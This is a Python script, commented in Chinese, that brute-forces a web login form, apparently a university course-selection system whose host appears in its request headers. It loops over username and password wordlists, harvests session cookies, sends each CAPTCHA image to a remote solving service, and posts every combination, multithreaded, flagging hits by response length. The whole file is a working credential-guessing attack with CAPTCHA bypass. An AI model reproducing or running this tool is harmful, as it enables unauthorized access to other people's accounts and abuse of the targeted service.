# -*- coding: utf-8 -*-
"""
Created on Mon Jul  9 20:41:03 2018
@author: 康文洋
"""

from Config import Config
from fileOperator import fileOperator
import requests
from bs4 import BeautifulSoup
import re
import sys
import re
import os, time, random,json
from threading import Thread
import threading
from concurrent.futures import ThreadPoolExecutor

class Main():
    ResultContent = {}  # {'length_username':{'count':count,'password':password}}
    timer = None
    def __init__(self):
        self.conf = Config()
        self.fileop = fileOperator()
        #self.cookiesData = [{},{},{}]
        self.initCookiesData()
        self.cookie_index = -1
        self.usernamePath = self.fileop.getCurrentPath() + '/username.txt'
        self.passwordPath = self.fileop.getCurrentPath() + '/password.txt'

    def initCookiesData(self):
        self.cookiesData= []
        # cookiesData = [{"JSESSIONID":"43ABA87A13C4048E9BFBAC7B6910AD4C"}]
        for cookie in self.conf.Cookies:
            tempcookie = {}
            for cookie in cookie.split(";"):
                temp = cookie.split("=")
                if temp[0] in self.conf.CookiesField:tempcookie[temp[0]] = temp[1]
            # print(cookiesData)
            self.cookiesData.append(tempcookie)
        return True

    def AddResultContent(self,username,password,length):
        key = str(length)+'_'+str(username)
        if key in self.ResultContent.keys():
            self.ResultContent[key]['count'] += 1
            self.ResultContent[key]['password'] = password
        else:
            self.ResultContent[key]={}
            self.ResultContent[key]['count'] = 1
            self.ResultContent[key]['password'] = password

    def ShowResultContent(self):
        print('')
        print('------------------ShowResultContent------------------')
        print('username\t password\t response.length\t response.count\t')
        for key in  self.ResultContent:
            username = key.split('_')[1]
            password = self.ResultContent[key]['password']
            response_length = str(key.split('_')[0])
            response_count = str(self.ResultContent[key]['count'])
            #print(key.split('_'))
            #print(self.ResultContent[key])
            print(username+'\t '+ password+'\t\t '+response_length+'\t\t '+response_count)

    def ShowResultContentTimer(self):
        self.ShowResultContent()
        self.timer = threading.Timer(self.conf.Result_Time, self.ShowResultContent)
        self.timer.start()

    def GetHearders(self):
        headers = {}
        #headers["Host"] = "xkxt.ecjtu.jx.cn"
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0"
        headers["Referer"] = "http://xkxt.ecjtu.jx.cn/login/quit_Quit.action"
        headers["Connection"] = "close"
        headers["Content-Type"] = "application/x-www-form-urlencoded"
        return headers

    def SetCookiesData(self):
        url = self.conf.CookieURL
        # print(url)
        headers = self.GetHearders()
        # print(headers)
        # 获得Cookie
        response = requests.get(url, headers=headers)
        print(response.headers)
        # 保存cookie
        self.conf.Cookies.append(response.headers['Set-Cookie'])
        return True

    def GetCookiesData(self,cookie_num):
        #cookiesData = {"JSESSIONID":"43ABA87A13C4048E9BFBAC7B6910AD4C"}
        #cookiesData = {}
        #for cookie in self.conf.Cookies.split(";"):
        #    temp = cookie.split("=")
        #    cookiesData[temp[0]] = temp[1]
        #print(cookiesData)
        return self.cookiesData[cookie_num]

    def GetCurrentCookieIndex(self):
        #print('GetCurrentCookieIndex          :    '+str(self.cookie_index))
        if self.conf.IsSingleThread:return 0
        else:
            self.cookie_index += 1
            return self.cookie_index % self.conf.Multithread_Num

    def GetPostData(self,username='',password='',code=''):
        postData = {
            "username": username,
            "password": password,
            "code": code
        }
        return postData

    def SaveImage(self,imgContent):
        imgName = hash(imgContent)
        filePath = self.fileop.getCurrentPath() + '/img/' + str(imgName) + ".jpg"
        try:
            #print("filePath===" + filePath)
            f = open(filePath, 'wb')
            f.write(imgContent)
            f.close()
            return filePath
        except Exception as e:
            print("e====" + str(e))
            return ''

    def GetCodeImg(self,cookie_num):
        url = self.conf.CodeUrl
        #print(url)
        headers = self.GetHearders()
        #print(headers)
        cookiesData = self.GetCookiesData(cookie_num)
        #print(cookiesData)
        #获得图片流
        image = requests.get(url, cookies=cookiesData, headers=headers)
        #print(image.text)
        #保存图片
        image_path = self.SaveImage(image.content)
        return image_path

    def getCodeNum(self,image_path):
        url = self.conf.ServerAPI
        # print(url)

        files = {'img':('imagename.jpg',open(image_path,'rb'),'image/jpeg',{})}

        result = requests.post(url, data={"type":"1"}, files=files)
        print(result.text)
        result_obj = json.loads(result.text)
        if result_obj['status']=="succses":return result_obj['num']
        else:return False

    def Blasting(self,username,password,image_num,cookie_num):
        url = self.conf.LoginUrl
        #print(url)
        headers = self.GetHearders()
        #print(headers)
        postData = self.GetPostData(username,password, image_num)
        #print(postData)
        cookiesData = self.GetCookiesData(cookie_num)
        #print(cookiesData)

        r = requests.post(url, data=postData, cookies=cookiesData, headers=headers)
        #print(len(r.text))
        self.AddResultContent(username,password,len(r.text))
        # 输出结果
        #print(str(cookie_num) + " | ", end='')
        print(username + " | ", end='')
        print(password + " | ", end='')
        print(image_num + " | ", end='')
        print(len(r.text))
        return True

    def SingleThread(self):
        print('SingleThread start')
        self.conf.Cookies = []
        self.SetCookiesData()
        self.initCookiesData()

        # 读取UserName文件
        f_username = open(self.usernamePath)  # 返回一个文件对象
        line_username = f_username.readline().strip('\n')  # 调用文件的 readline()方法
        while line_username:
            #print(line_username, end='')  # 在 Python 3中使用
            # 读取PassWord文件
            f_password = open(self.passwordPath)  # 返回一个文件对象
            line_password = f_password.readline().strip('\n')  # 调用文件的 readline()方法
            while line_password:
                #print(line_password, end='')  # 在 Python 3中使用

                # 调用爆破方法
                image_path = self.GetCodeImg(0)
                image_num = self.getCodeNum(image_path)
                if image_num is not False: pass

                #print(image_num)
                result_flag = self.Blasting(line_username,line_password,image_num,0)
                #print(result_flag)
                #输出结果
                #print(line_username+" | ",end='')
                #print(line_password+" | ",end='')
                #print(result_length)

                line_password = f_password.readline().strip('\n')
            f_password.close()

            line_username = f_username.readline().strip('\n')
        f_username.close()
        print('SingleThread end')

    def Multithread(self):
        print('Multithread start')

        #初始化cookies
        self.conf.Cookies= []
        for i in range(self.conf.Multithread_Num):
            self.SetCookiesData()
        self.initCookiesData()

        with ThreadPoolExecutor(self.conf.Multithread_Num) as executor:
            # 读取UserName文件
            f_username = open(self.usernamePath)  # 返回一个文件对象
            line_username = f_username.readline().strip('\n')  # 调用文件的 readline()方法
            while line_username:
                # print(line_username, end='')  # 在 Python 3中使用
                # 读取PassWord文件
                f_password = open(self.passwordPath)  # 返回一个文件对象
                line_password = f_password.readline().strip('\n')  # 调用文件的 readline()方法
                while line_password:
                    # print(line_password, end='')  # 在 Python 3中使用

                    # 调用爆破方法
                    current_cookie_index = self.GetCurrentCookieIndex()
                    image_path = self.GetCodeImg(current_cookie_index)
                    image_num = self.getCodeNum(image_path)
                    if image_num is not False:pass

                    # print(image_num)
                    executor.submit(self.Blasting,line_username, line_password, image_num,current_cookie_index)
                    # print(result_length)
                    # 输出结果
                    #print(line_username + " | ", end='')
                    #print(line_password)

                    line_password = f_password.readline().strip('\n')
                f_password.close()

                line_username = f_username.readline().strip('\n')
            f_username.close()
        print('Multithread end')

    def Run(self):
        self.timer = threading.Timer(1, self.ShowResultContentTimer)  # 首次启动
        self.timer.start()

        starttime = time.time()
        if self.conf.IsSingleThread:self.SingleThread()
        else:self.Multithread()
        endtime = time.time()
        print("spend time: " + str(endtime - starttime)+" 秒")
        self.ShowResultContent()
        
    def Test(self):
        self.getCodeNum('ClientBlastingRemote\img\8484.jpg')


main = Main()
#main.Test()  #测试用
main.Run()